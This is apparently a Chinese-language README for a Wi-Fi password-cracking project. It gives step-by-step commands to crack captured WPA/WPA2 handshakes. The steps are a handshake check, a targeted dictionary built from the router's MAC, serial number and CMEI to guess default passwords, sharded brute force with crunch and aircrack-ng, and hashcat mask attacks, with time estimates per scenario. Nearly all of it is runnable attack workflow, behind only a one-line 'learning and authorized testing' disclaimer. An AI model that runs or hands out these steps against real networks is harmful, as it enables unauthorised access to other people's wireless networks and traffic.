# WPA/WPA2 破解指南

本指南介绍如何使用本项目工具破解 WPA/WPA2 握手包。

> ⚠️ 仅供学习和授权测试使用。

## 前置条件

- 已安装 `aircrack-ng`：`apt install aircrack-ng`
- 已安装 `crunch`：`apt install crunch`
- 已捕获包含完整 4 次握手的 pcap 文件
- 知道 ESSID（WiFi 名称）和 BSSID（MAC 地址）

## 第一步：检查握手包

```bash
python3 check_handshake.py handshake.pcap
```

确认有至少 1 次完整的 EAPOL 握手（Message 1/2/3/4）。

## 第二步：定向字典（优先尝试）

基于路由器硬件信息（MAC/SN/CMEI）生成候选密码，命中率高、速度快。

### 编辑配置

打开 `gen_targeted_dict.py`，修改：

```python
MAC = "AABBCCDDEEFF"        # 路由器 MAC（12位，无冒号）
SN = "XXXXXXXXXXXX"         # 序列号
CMEI = "000000000000000"    # CMEI（可选）

KNOWN_DIGIT = ""            # 倒数第二位数字（0-9），不知道留空
KNOWN_LAST_CHAR = ""        # 最后一位字母（a-z），不知道留空
KNOWN_PREFIX = ""           # 已知前缀，不知道留空
```

### 生成并破解

```bash
./crack_with_dict.sh -b "aa:bb:cc:dd:ee:ff" -e "MyWiFi" handshake.pcap
```

定向字典通常只有几百到几千个候选，几分钟内跑完。

## 第三步：暴力破解（定向失败后）

如果定向字典没中，再考虑暴力破解。

### 密码格式

默认格式：`6位小写字母 + 1位数字 + 1位小写字母`，共 8 位。

如果知道部分信息，可以大幅缩小范围：

| 已知信息 | 组合数 | 2核VPS | 中端GPU |
|---------|--------|--------|---------|
| 都不知道 | 803 亿 | ~5 年 | 几天 |
| 知道数字 | 80 亿 | ~6 个月 | 几小时 |
| 知道末位字母 | 31 亿 | ~2 个月 | 1 小时 |
| 知道数字+末位 | 3 亿 | ~1 周 | 几分钟 |

### 分片策略

按首字母分成 26 片，每片跑一个字母：

```bash
# 跑首字母 a 开头的所有组合
./crack_split.sh -b "aa:bb:cc:dd:ee:ff" -e "MyWiFi" a

# 知道数字和末位时
./crack_split.sh -b "aa:bb:cc:dd:ee:ff" -e "MyWiFi" -d 2 -l f a
```

### 后台运行

```bash
apt install screen -y
screen -S wifi -dm ./crack_split.sh -b "..." -e "..." -d 2 -l f a

# 查看状态
screen -r wifi

# 退出（不停止）：Ctrl+A 再按 D
```

### 进度查看

```bash
tail -f crack_a.log
```

## 推荐流程

1. ✅ **先跑定向字典**（几分钟，高命中率）
2. ✅ 知道密码规则的话，先填已知字符缩小范围
3. ⚠️ **最后再暴力破解**（耗时长，建议用 GPU）

## GPU 加速（可选）

如果有 NVIDIA 显卡，用 hashcat 速度快几十倍：

```bash
# 转换格式
apt install hcxtools
hcxpcapngtool -o hash.hc22000 handshake.pcap

# mask 攻击（6小写+1数字+1小写）
hashcat -m 22000 -a 3 hash.hc22000 ?l?l?l?l?l?l?d?l

# 知道数字=2 末位=f
hashcat -m 22000 -a 3 hash.hc22000 ?l?l?l?l?l?l2f
```
